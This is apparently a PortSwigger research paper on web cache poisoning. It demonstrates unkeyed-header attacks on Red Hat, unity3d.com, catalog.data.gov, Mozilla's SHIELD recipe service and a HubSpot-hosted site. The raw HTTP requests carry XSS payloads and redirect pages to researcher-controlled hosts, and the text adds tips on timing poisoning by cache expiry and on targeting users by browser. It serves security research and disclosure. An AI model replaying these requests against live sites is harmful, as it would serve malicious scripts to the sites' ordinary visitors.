[ORIGINAL URL](https://portswigger.net/research/practical-web-cache-poisoning)



### Cache keys

 The concept of caching might sound clean and simple, but it hides some risky assumptions. Whenever a cache receives a request for a resource, it needs to decide whether it has a  copy of this exact resource already saved and can reply with that, or if it needs to forward the request to the application server. 

  Identifying whether two requests are trying to load the same resource  can be tricky; requiring that the requests match byte-for-byte is  utterly ineffective, as HTTP requests are full of inconsequential data,  such as the requester's browser: 

```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close
```

 Caches tackle this problem using the concept of cache keys – a few  specific components of a HTTP request that are taken to fully identify  the resource being requested. In the request above, I've highlighted the values included in a typical cache key in orange. 

This means  that caches think the following two requests are equivalent, and will  happily respond to the second request with a response cached from the  first:

```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```

`````http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
`````



As a result, the page will be served in the wrong language to the second  visitor. This hints at the problem – any difference in the response  triggered by an unkeyed input may be stored and served to other users.  In theory, sites can use the 'Vary' response header to specify  additional request headers that should be keyed. in practice, the Vary  header is only used in a rudimentary way, CDNs like Cloudflare ignore it outright, and people don't even realise their application supports any  header-based input. 

This causes a healthy number of accidental  breakages, but the fun really starts when someone intentionally sets out to exploit it.

### Cache Poisoning

 The  objective of web cache poisoning is to send a request that causes a  harmful response that gets saved in the cache and served to other users. 

In this paper, we're going to poison caches using unkeyed inputs like HTTP headers. This isn't the only way of poisoning caches - you can also use HTTP Response Splitting and [Request Smuggling](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) - but it is the most reliable. Please note that web caches also enable a different type of attack called [Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html) which should not be confused with cache poisoning. 

### Methodology

We'll use the following methodology to find cache poisoning vulnerabilities:

Rather than attempt to explain this in depth upfront, I'll give a quick  overview then demonstrate it being applied to real websites. 

The  first step is to identify unkeyed inputs. Doing this manually is tedious so I've developed an open source Burp Suite extension called [Param Miner](https://github.com/PortSwigger/param-miner) that automates this step by guessing header/cookie names, and observing whether they have an effect on the application's response. 

  After finding an unkeyed input, the next steps are to assess how much  damage you can do with it, then try and get it stored in the cache. If  that fails, you'll need to gain a better understanding of how the cache  works and hunt down a cacheable target page before retrying. Whether a  page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers. 

Cached responses can mask unkeyed inputs, so if you're trying to manually  detect or explore unkeyed inputs, a cache-buster is crucial. If you have Param Miner loaded, you can ensure every request has a unique cache key by adding a parameter with a value of $randomplz to the query string. 

When auditing a live website, accidentally poisoning other visitors is a  perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp. This cache buster has a fixed value so you can observe caching behaviour yourself without it affecting other  users.

### Basic Poisoning 

 In spite of its  fearsome reputation, cache poisoning is often very easy to exploit. To  get started, let's take a look at Red Hat's homepage. Param Miner  immediately spotted an unkeyed input:

`````http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://canary/cms/social.png" />
`````

Here we can see that the X-Forwarded-Host header has been used by the  application to generate an Open Graph URL inside a meta tag. The next  step is to explore whether it's exploitable – we'll start with a simple [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) payload:

`````http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
`````

Looks good – we've just confirmed that we can cause a response that will execute arbitrary JavaScript against whoever views it. The final step  is to check if this response has been stored in a cache so that it'll be delivered to other users. Don't let the 'Cache Control: no-cache'  header dissuade you – it's always better to attempt an attack than  assume it won't work. You can verify first by resending the request  without the malicious header, and then by fetching the URL directly in a browser on a different machine: 

`````http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com

HTTP/1.1 200 OK
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
`````

That was easy. Although the response doesn't have any headers that  suggest a cache is present, our exploit has clearly been cached. A quick DNS lookup offers an explanation – www.redhat.com is a CNAME to  www.redhat.com.edgekey.net, indicating that it's using Akamai's CDN. 

### Discreet poisoning

 At this point  we've proven the attack is possible by poisoning  https://www.redhat.com/en?dontpoisoneveryone=1 to avoid affecting the  site's actual visitors. In order to actually poison the blog's homepage  and deliver our exploit to all subsequent visitors, we'd need to ensure  we sent the first request to the homepage after the cached response  expired. 

 This could be attempted using a tool like Burp Intruder or a custom script to send a large number of requests, but such a  traffic-heavy approach is hardly subtle. An attacker could potentially  avoid this problem by reverse engineering the target's cache expiry  system and predicting exact expiry times by perusing documentation and  monitoring the site over time, but that sounds distinctly like hard  work. 

Luckily, many websites make our life easier. Take this cache poisoning vulnerability in unity3d.com:

``````http
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
``````

 We have an unkeyed input - the X-Host header – being used to  generate a script import. The response headers 'Age' and 'max-age'  respectively specify the age of the current response, and the age at  which it will expire. Taken together, these tell us the precise second  we should send our payload to ensure our response gets cached. 

### Selective Poisoning

 HTTP headers can provide other time-saving insights into the inner  workings of caches. Take the following well-known website, which is  using Fastly and sadly can't be named: 

``````http
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 … Firefox/60.0
X-Forwarded-Host: a"><iframe onload=alert(1)>

HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
</iframe> 
``````

 This initially looks almost identical to the first example. However, the Vary header tells us that our User-Agent may be part of the cache  key, and manual testing confirms this. This means that because we've  claimed to be using Firefox 60, our exploit will only be served to other Firefox 60 users. We could use a list of popular user agents to ensure  most visitors receive our exploit, but this behaviour has given us the  option of more selective attacks. Provided you knew their user agent,  you could potentially tailor the attack to target a specific person, or  even conceal itself from the website monitoring team. 

### DOM Poisoning

Exploiting an unkeyed input isn't always as easy as pasting an XSS payload. Take the following request: 

``````http
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
<body data-site-root="https://canary/">
``````

We've got control of the 'data-site-root' attribute, but we can't break  out to get XSS and it's not clear what this attribute is even used for.  To find out, I created a match and replace rule in Burp to add an  'X-Forwarded-Host: id.burpcollaborator.net' header to all requests, then browsed the site. When certain pages loaded, Firefox sent a  JavaScript-generated request to my server: 

``````http
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
``````

The path suggests that somewhere on the website, there's JavaScript code using the data-site-root attribute to decide where to load some  internationalisation data from. I attempted to find out what this data  ought to look like by fetching https://catalog.data.gov/api/i18n/en, but merely received an empty JSON response. Fortunately, changing 'en' to  'es' gave a clue:

``````http
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov

HTTP/1.1 200 OK
…
{"Show more":"Mostrar más"}
``````

The file contains a map for translating phrases into the user's selected language. By creating our own translation file and  using cache poisoning to point users toward that, we could translate  phrases into exploits:

``````http
GET  /api/i18n/en HTTP/1.1
Host: portswigger-labs.net

HTTP/1.1 200 OK
...
{"Show more":"<svg onload=alert(1)>"}
``````

The end result? Anyone who viewed a page containing the text 'Show more' would get exploited.

### Hijacking Mozilla SHIELD

The  'X-Forwarded-Host' match/replace rule I configured to help with the last vulnerability had an unexpected side effect. In addition to the  interactions from catalog.data.gov, I received some that were distinctly mysterious:

``````http
GET /api/v1/recipe/signed/ HTTP/1.1
Host: xyz.burpcollaborator.net
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: application/json
origin: null
X-Forwarded-Host: xyz.burpcollaborator.net
``````

I had previously encountered the 'null' origin in my [CORS vulnerability research](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties), but I'd never seen a browser issue a fully lowercase Origin header  before. Sifting through proxy history logs revealed that the culprit was Firefox itself. Firefox had tried to fetch a list of 'recipes' as part  of its [SHIELD](https://wiki.mozilla.org/Firefox/Shield)  system for silently installing extensions for marketing and research  purposes. This system is probably best known for forcibly distributing a 'Mr Robot' extension, causing considerable [consumer backlash](https://www.cnet.com/news/mozilla-backpedals-after-mr-robot-firefox-misstep/). 

Anyway, it looked like the X-Forwarded-Host header had fooled  this system into directing Firefox to my own website in order to fetch  recipes:

``````http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net

HTTP/1.1 200 OK
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
   …
}
``````

Recipes look something like:

``````http
[{
  "id": 403,
  "last_updated": "2017-12-15T02:05:13.006390Z",
  "name": "Looking Glass (take 2)",
  "action": "opt-out-study",
  "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
  "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
}]
``````

This system was using NGINX for caching, which was naturally happy to save my poisoned response and serve it to other users. Firefox fetches  this URL shortly after the browser is opened and also periodically  refetches it, ultimately meaning all of Firefox's tens of millions of  daily users could end up retrieving recipes from my website. 

This offered quite a few possibilities. The recipes used by Firefox were [signed](https://github.com/mozilla-services/autograph/tree/master/signer/contentsignature) so I couldn't just install a malicious addon and get full code  execution, but I could direct tens of millions of genuine users to a URL of my choice. Aside from the obvious DDoS usage, this would be  extremely serious if combined with an appropriate memory corruption  vulnerability. Also, some backend Mozilla systems use unsigned recipes,  which could potentially be used to obtain a foothold deep inside their  infrastructure and perhaps obtain the recipe-signing key. 

### Route poisoning

Some applications go beyond foolishly using headers to generate URLs, and foolishly use them for internal request routing

``````http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary

HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
…
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
``````

Goodhire.com is evidently hosted on HubSpot, and HubSpot is giving the  X-Forwarded-Server header priority over the Host header and getting  confused about which client this request is intended for. Although our  input is reflected in the page, it's HTML encoded so a straightforward  XSS attack doesn't work here. To exploit this, we need to go to  hubspot.com, register ourselves as a HubSpot client, place a payload on  our HubSpot page, and then finally trick HubSpot into serving this  response on goodhire.com: 

``````http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com

HTTP/1.1 200 OK
…
<script>alert(document.domain)</script>
``````

Cloudflare happily cached this response and served it to subsequent visitors. 